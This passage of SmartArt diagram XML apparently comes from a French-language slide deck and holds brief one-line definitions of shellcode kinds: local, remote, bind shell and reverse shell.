    <dgm:pt modelId="{22C3CECA-0E11-401C-B592-F0B117A39E2F}" type="parTrans" cxnId="{66905B85-7D51-42B1-A571-EAC075A3B8C4}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E372AAEC-CDDA-4F78-8AF1-2A338DDC3A19}" type="sibTrans" cxnId="{66905B85-7D51-42B1-A571-EAC075A3B8C4}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{55A1EEBF-9ED3-43B2-A16C-A994DAF23FBD}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>S'exécute sur une machine déjà compromise.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6159E64D-1DB7-42AD-8088-39D830A2651F}" type="parTrans" cxnId="{A7269CC3-BB03-468E-B8B6-38509F20E8F0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{BC913068-818A-4016-811B-F43884846240}" type="sibTrans" cxnId="{A7269CC3-BB03-468E-B8B6-38509F20E8F0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F5F53CE9-0E75-4432-BB7E-EC8B7D541A47}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>2. Shellcode distant :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{467A5BFC-F080-41D1-8326-081057527293}" type="parTrans" cxnId="{D3A1E70D-ADC5-4D3B-BC45-F130B51DD6AC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1C086662-7B2A-4D46-B9BD-87F1E61B0A72}" type="sibTrans" cxnId="{D3A1E70D-ADC5-4D3B-BC45-F130B51DD6AC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{87C33B38-E15C-4A6B-A57B-F51FB09B695C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Injecté dans une machine distante via des failles.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D11A182D-400A-4CED-94CE-019AFB0EAA91}" type="parTrans" cxnId="{4B12F4FC-B21A-4F6C-BF0A-B8BDC31A24B5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{96B6D1B3-D4F2-41D6-9168-F8CBC8686ACE}" type="sibTrans" cxnId="{4B12F4FC-B21A-4F6C-BF0A-B8BDC31A24B5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3A085548-DD2E-4408-A32C-50F1E4C92754}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>3. Bind shell :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D5FE3594-2168-466B-A087-AF4E82BDA75C}" type="parTrans" cxnId="{5A8AED44-C49C-428E-9829-64DC2A2DF2DB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D2D14418-4378-496D-A891-407BCC3F35D4}" type="sibTrans" cxnId="{5A8AED44-C49C-428E-9829-64DC2A2DF2DB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B81C6A15-AAA8-4B00-8101-96A29CA1087B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Ouvre un port sur la machine cible pour un accès distant.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{CC260329-01A3-4020-AE40-B440D2C312EF}" type="parTrans" cxnId="{62EFFA7A-674F-4CAE-AE52-342A6CBBD8F3}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A069C88C-3D03-4CF8-AAB2-0D2DE038E4B6}" type="sibTrans" cxnId="{62EFFA7A-674F-4CAE-AE52-342A6CBBD8F3}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{10CAD12A-8D2B-4B24-90D1-AA03A96FA8E2}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>4. Reverse shell :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C4F9693C-080D-4F2D-BF9F-E1EF57287D37}" type="parTrans" cxnId="{C0244B40-840A-4EDF-917B-C5AFFA6E28DC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{68D8E7BA-B986-4AAD-BC1F-CEBB2EDCAD7F}" type="sibTrans" cxnId="{C0244B40-840A-4EDF-917B-C5AFFA6E28DC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8A132C60-DAA4-4A40-8D7E-E2B7B0684E28}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>La cible initie une connexion vers l’attaquant.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B06DA896-4AAE-4431-9C24-8D5A8EB97C3B}" type="parTrans" cxnId="{5D763B9E-C812-4DFE-99D0-0C79961F7152}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{61F00329-DE8B-411E-AB2C-8FE2043244B7}" type="sibTrans" cxnId="{5D763B9E-C812-4DFE-99D0-0C79961F7152}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{277AD1FB-E280-614E-8F29-FA833929F772}" type="pres">
      <dgm:prSet presAssocID="{D8A4584A-4AFF-41AD-A916-32A540C4BD6A}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{38F7F6FC-5155-F943-9482-4309B71D73B8}" type="pres">
      <dgm:prSet presAssocID="{16F561CA-C8F1-4CFC-B8CE-8175F41E695F}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{AF609059-F22D-7F40-BCF9-E8EE28E8D339}" type="pres">
      <dgm:prSet presAssocID="{16F561CA-C8F1-4CFC-B8CE-8175F41E695F}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="4"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{BC6F2F79-968C-B74B-A4CE-F3AAE371B5DB}" type="pres">
      <dgm:prSet presAssocID="{16F561CA-C8F1-4CFC-B8CE-8175F41E695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C268273-69DF-0040-8804-0FDB7767E51B}" type="pres">
      <dgm:prSet presAssocID="{16F561CA-C8F1-4CFC-B8CE-8175F41E695F}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E23E442F-989D-6F43-9E37-3DA0F8DF154C}" type="pres">
      <dgm:prSet presAssocID="{16F561CA-C8F1-4CFC-B8CE-8175F41E695F}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="0" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{6BA4AFAA-C555-9C4F-949B-3D0EC48CF0DB}" type="pres">
      <dgm:prSet presAssocID="{E372AAEC-CDDA-4F78-8AF1-2A338DDC3A19}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{196BCC0C-B28B-8F44-AB1C-4D92F11075CE}" type="pres">
      <dgm:prSet presAssocID="{F5F53CE9-0E75-4432-BB7E-EC8B7D541A47}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{AC5FB5F7-B40C-284F-8804-F715AA07858A}" type="pres">
      <dgm:prSet presAssocID="{F5F53CE9-0E75-4432-BB7E-EC8B7D541A47}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="4"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B3C989DD-ED6E-2B43-A851-7824994DE895}" type="pres">
      <dgm:prSet presAssocID="{F5F53CE9-0E75-4432-BB7E-EC8B7D541A4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7FEEE09-EB1A-1048-914F-EA121D83C67A}" type="pres">
      <dgm:prSet presAssocID="{F5F53CE9-0E75-4432-BB7E-EC8B7D541A47}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{52B5B9AE-7129-A744-BBF3-B928908A47EE}" type="pres">
      <dgm:prSet presAssocID="{F5F53CE9-0E75-4432-BB7E-EC8B7D541A47}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="1" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{331AAF3F-A9CB-4A44-A23D-6D77BC609D8E}" type="pres">
      <dgm:prSet presAssocID="{1C086662-7B2A-4D46-B9BD-87F1E61B0A72}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{0517F7D5-3F76-E84F-B142-AC4BC2791B8A}" type="pres">
      <dgm:prSet presAssocID="{3A085548-DD2E-4408-A32C-50F1E4C92754}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{675680B3-55E9-264C-978C-5A261125827B}" type="pres">
      <dgm:prSet presAssocID="{3A085548-DD2E-4408-A32C-50F1E4C92754}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="1" presStyleCnt="4"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E46ED8CF-05AB-B34B-8738-71569373E6C8}" type="pres">
      <dgm:prSet presAssocID="{3A085548-DD2E-4408-A32C-50F1E4C9275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DD0E0F3-5E75-9947-A0F1-EE8C4B1B2BD9}" type="pres">
      <dgm:prSet presAssocID="{3A085548-DD2E-4408-A32C-50F1E4C92754}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{F582540E-B8E1-A841-B2CB-1A0FED7A6609}" type="pres">
      <dgm:prSet presAssocID="{3A085548-DD2E-4408-A32C-50F1E4C92754}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="2" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{5632E2C4-5298-6E4B-9CD6-5E95BEAE88D4}" type="pres">
      <dgm:prSet presAssocID="{D2D14418-4378-496D-A891-407BCC3F35D4}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E16CE82E-5577-B34C-884C-BA8004A5F2BD}" type="pres">
      <dgm:prSet presAssocID="{10CAD12A-8D2B-4B24-90D1-AA03A96FA8E2}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{CB42D5C5-67E4-924C-B519-C43B9E5E18CD}" type="pres">
      <dgm:prSet presAssocID="{10CAD12A-8D2B-4B24-90D1-AA03A96FA8E2}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="2" presStyleCnt="4"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{8B1714A6-D320-384D-9E45-EBBFBB92C7A6}" type="pres">
      <dgm:prSet presAssocID="{10CAD12A-8D2B-4B24-90D1-AA03A96FA8E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193A492-85AB-7443-8155-A2400E12ACDC}" type="pres">
      <dgm:prSet presAssocID="{10CAD12A-8D2B-4B24-90D1-AA03A96FA8E2}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{694A654D-8F3A-A742-81FB-3805CA6D0CA9}" type="pres">
      <dgm:prSet presAssocID="{10CAD12A-8D2B-4B24-90D1-AA03A96FA8E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A768406-397F-224F-A680-6D635242090A}" type="presOf" srcId="{16F561CA-C8F1-4CFC-B8CE-8175F41E695F}" destId="{AF609059-F22D-7F40-BCF9-E8EE28E8D339}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{D3A1E70D-ADC5-4D3B-BC45-F130B51DD6AC}" srcId="{D8A4584A-4AFF-41AD-A916-32A540C4BD6A}" destId="{F5F53CE9-0E75-4432-BB7E-EC8B7D541A47}" srcOrd="1" destOrd="0" parTransId="{467A5BFC-F080-41D1-8326-081057527293}" sibTransId="{1C086662-7B2A-4D46-B9BD-87F1E61B0A72}"/>
    <dgm:cxn modelId="{9849D013-6F6F-984C-9DC8-9332B3AE4B90}" type="presOf" srcId="{55A1EEBF-9ED3-43B2-A16C-A994DAF23FBD}" destId="{E23E442F-989D-6F43-9E37-3DA0F8DF154C}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{5657E72D-5413-204B-BF98-6CCB09A7E28B}" type="presOf" srcId="{D8A4584A-4AFF-41AD-A916-32A540C4BD6A}" destId="{277AD1FB-E280-614E-8F29-FA833929F772}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{10F52C35-A7B6-5D49-AA9A-B6D9C979A43F}" type="presOf" srcId="{10CAD12A-8D2B-4B24-90D1-AA03A96FA8E2}" destId="{8B1714A6-D320-384D-9E45-EBBFBB92C7A6}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{1DA08535-7060-2B43-BC81-90FAD26086FE}" type="presOf" srcId="{10CAD12A-8D2B-4B24-90D1-AA03A96FA8E2}" destId="{CB42D5C5-67E4-924C-B519-C43B9E5E18CD}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{C0244B40-840A-4EDF-917B-C5AFFA6E28DC}" srcId="{D8A4584A-4AFF-41AD-A916-32A540C4BD6A}" destId="{10CAD12A-8D2B-4B24-90D1-AA03A96FA8E2}" srcOrd="3" destOrd="0" parTransId="{C4F9693C-080D-4F2D-BF9F-E1EF57287D37}" sibTransId="{68D8E7BA-B986-4AAD-BC1F-CEBB2EDCAD7F}"/>
    <dgm:cxn modelId="{5A8AED44-C49C-428E-9829-64DC2A2DF2DB}" srcId="{D8A4584A-4AFF-41AD-A916-32A540C4BD6A}" destId="{3A085548-DD2E-4408-A32C-50F1E4C92754}" srcOrd="2" destOrd="0" parTransId="{D5FE3594-2168-466B-A087-AF4E82BDA75C}" sibTransId="{D2D14418-4378-496D-A891-407BCC3F35D4}"/>
    <dgm:cxn modelId="{5E706352-C669-B743-9D46-369496526720}" type="presOf" srcId="{B81C6A15-AAA8-4B00-8101-96A29CA1087B}" destId="{F582540E-B8E1-A841-B2CB-1A0FED7A6609}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{0DB8EB67-8902-A640-AD3D-053B1161748C}" type="presOf" srcId="{8A132C60-DAA4-4A40-8D7E-E2B7B0684E28}" destId="{694A654D-8F3A-A742-81FB-3805CA6D0CA9}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{C552536E-16C7-F14A-BF10-28CEAAF4D611}" type="presOf" srcId="{87C33B38-E15C-4A6B-A57B-F51FB09B695C}" destId="{52B5B9AE-7129-A744-BBF3-B928908A47EE}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{89C79B6F-66DD-6A47-937E-63CFE4E76D16}" type="presOf" srcId="{F5F53CE9-0E75-4432-BB7E-EC8B7D541A47}" destId="{B3C989DD-ED6E-2B43-A851-7824994DE895}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{62EFFA7A-674F-4CAE-AE52-342A6CBBD8F3}" srcId="{3A085548-DD2E-4408-A32C-50F1E4C92754}" destId="{B81C6A15-AAA8-4B00-8101-96A29CA1087B}" srcOrd="0" destOrd="0" parTransId="{CC260329-01A3-4020-AE40-B440D2C312EF}" sibTransId="{A069C88C-3D03-4CF8-AAB2-0D2DE038E4B6}"/>
    <dgm:cxn modelId="{66905B85-7D51-42B1-A571-EAC075A3B8C4}" srcId="{D8A4584A-4AFF-41AD-A916-32A540C4BD6A}" destId="{16F561CA-C8F1-4CFC-B8CE-8175F41E695F}" srcOrd="0" destOrd="0" parTransId="{22C3CECA-0E11-401C-B592-F0B117A39E2F}" sibTransId="{E372AAEC-CDDA-4F78-8AF1-2A338DDC3A19}"/>
    <dgm:cxn modelId="{51B18287-FE67-834E-A73B-50143AEEAF89}" type="presOf" srcId="{3A085548-DD2E-4408-A32C-50F1E4C92754}" destId="{675680B3-55E9-264C-978C-5A261125827B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{5D763B9E-C812-4DFE-99D0-0C79961F7152}" srcId="{10CAD12A-8D2B-4B24-90D1-AA03A96FA8E2}" destId="{8A132C60-DAA4-4A40-8D7E-E2B7B0684E28}" srcOrd="0" destOrd="0" parTransId="{B06DA896-4AAE-4431-9C24-8D5A8EB97C3B}" sibTransId="{61F00329-DE8B-411E-AB2C-8FE2043244B7}"/>
    <dgm:cxn modelId="{0D227AC3-28EB-264E-A5A3-39E6713A7087}" type="presOf" srcId="{3A085548-DD2E-4408-A32C-50F1E4C92754}" destId="{E46ED8CF-05AB-B34B-8738-71569373E6C8}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{A7269CC3-BB03-468E-B8B6-38509F20E8F0}" srcId="{16F561CA-C8F1-4CFC-B8CE-8175F41E695F}" destId="{55A1EEBF-9ED3-43B2-A16C-A994DAF23FBD}" srcOrd="0" destOrd="0" parTransId="{6159E64D-1DB7-42AD-8088-39D830A2651F}" sibTransId="{BC913068-818A-4016-811B-F43884846240}"/>
    <dgm:cxn modelId="{1CE4A9CB-C40D-7148-A66C-BCEC863EAA78}" type="presOf" srcId="{F5F53CE9-0E75-4432-BB7E-EC8B7D541A47}" destId="{AC5FB5F7-B40C-284F-8804-F715AA07858A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{712D04E0-44AB-1048-9CEA-9BE4E9E21CF4}" type="presOf" srcId="{16F561CA-C8F1-4CFC-B8CE-8175F41E695F}" destId="{BC6F2F79-968C-B74B-A4CE-F3AAE371B5DB}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{4B12F4FC-B21A-4F6C-BF0A-B8BDC31A24B5}" srcId="{F5F53CE9-0E75-4432-BB7E-EC8B7D541A47}" destId="{87C33B38-E15C-4A6B-A57B-F51FB09B695C}" srcOrd="0" destOrd="0" parTransId="{D11A182D-400A-4CED-94CE-019AFB0EAA91}" sibTransId="{96B6D1B3-D4F2-41D6-9168-F8CBC8686ACE}"/>
    <dgm:cxn modelId="{3A6EE01E-E3B8-3744-90AF-FF03027508E1}" type="presParOf" srcId="{277AD1FB-E280-614E-8F29-FA833929F772}" destId="{38F7F6FC-5155-F943-9482-4309B71D73B8}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{17755287-0D5C-3F47-A709-8A6AD6C0CD1F}" type="presParOf" srcId="{38F7F6FC-5155-F943-9482-4309B71D73B8}" destId="{AF609059-F22D-7F40-BCF9-E8EE28E8D339}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{3D12FF3C-B5DD-114A-9A52-164655BEE149}" type="presParOf" srcId="{38F7F6FC-5155-F943-9482-4309B71D73B8}" destId="{BC6F2F79-968C-B74B-A4CE-F3AAE371B5DB}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{166D503B-A2E6-2D43-8ACA-7E72B283A2EC}" type="presParOf" srcId="{277AD1FB-E280-614E-8F29-FA833929F772}" destId="{FC268273-69DF-0040-8804-0FDB7767E51B}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{D62C5C4A-5727-F547-A7C0-AAFE708F5F7E}" type="presParOf" srcId="{277AD1FB-E280-614E-8F29-FA833929F772}" destId="{E23E442F-989D-6F43-9E37-3DA0F8DF154C}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{4BDEC5BD-5CF5-6542-82D9-6F9D9BAD5316}" type="presParOf" srcId="{277AD1FB-E280-614E-8F29-FA833929F772}" destId="{6BA4AFAA-C555-9C4F-949B-3D0EC48CF0DB}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{AFC58773-5AB7-EB44-BFB2-8F0AFC974C7F}" type="presParOf" srcId="{277AD1FB-E280-614E-8F29-FA833929F772}" destId="{196BCC0C-B28B-8F44-AB1C-4D92F11075CE}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{B7AE19D8-EB9F-EC43-ABE4-27952DBAC2EA}" type="presParOf" srcId="{196BCC0C-B28B-8F44-AB1C-4D92F11075CE}" destId="{AC5FB5F7-B40C-284F-8804-F715AA07858A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{D8ABB7AA-C963-5741-9A85-A95056793737}" type="presParOf" srcId="{196BCC0C-B28B-8F44-AB1C-4D92F11075CE}" destId="{B3C989DD-ED6E-2B43-A851-7824994DE895}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{EF120B6E-A554-8D4F-BD49-4546967CF8CF}" type="presParOf" srcId="{277AD1FB-E280-614E-8F29-FA833929F772}" destId="{57FEEE09-EB1A-1048-914F-EA121D83C67A}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{67741C13-3FF0-EF4C-9B2E-B77B55EF248A}" type="presParOf" srcId="{277AD1FB-E280-614E-8F29-FA833929F772}" destId="{52B5B9AE-7129-A744-BBF3-B928908A47EE}" srcOrd="6" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{6D9A3387-0794-294D-AA13-338A47637872}" type="presParOf" srcId="{277AD1FB-E280-614E-8F29-FA833929F772}" destId="{331AAF3F-A9CB-4A44-A23D-6D77BC609D8E}" srcOrd="7" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{338B48CE-D781-EE47-A413-609749361EC9}" type="presParOf" srcId="{277AD1FB-E280-614E-8F29-FA833929F772}" destId="{0517F7D5-3F76-E84F-B142-AC4BC2791B8A}" srcOrd="8" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{AAE4C4B8-2A70-1E45-B16C-B57C5DAC4F45}" type="presParOf" srcId="{0517F7D5-3F76-E84F-B142-AC4BC2791B8A}" destId="{675680B3-55E9-264C-978C-5A261125827B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{A32FECBB-DB57-1848-8E47-90EC4FA4A393}" type="presParOf" srcId="{0517F7D5-3F76-E84F-B142-AC4BC2791B8A}" destId="{E46ED8CF-05AB-B34B-8738-71569373E6C8}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{13DC8AB3-C65B-264E-AE64-65950578C5DD}" type="presParOf" srcId="{277AD1FB-E280-614E-8F29-FA833929F772}" destId="{3DD0E0F3-5E75-9947-A0F1-EE8C4B1B2BD9}" srcOrd="9" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{CEB8FB82-B0BB-E449-99BE-14CFD4B5DE85}" type="presParOf" srcId="{277AD1FB-E280-614E-8F29-FA833929F772}" destId="{F582540E-B8E1-A841-B2CB-1A0FED7A6609}" srcOrd="10" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{03453FBF-8904-064C-8E2E-C378D0124222}" type="presParOf" srcId="{277AD1FB-E280-614E-8F29-FA833929F772}" destId="{5632E2C4-5298-6E4B-9CD6-5E95BEAE88D4}" srcOrd="11" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{7E74669C-D447-8641-8F6B-492E68EB189D}" type="presParOf" srcId="{277AD1FB-E280-614E-8F29-FA833929F772}" destId="{E16CE82E-5577-B34C-884C-BA8004A5F2BD}" srcOrd="12" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
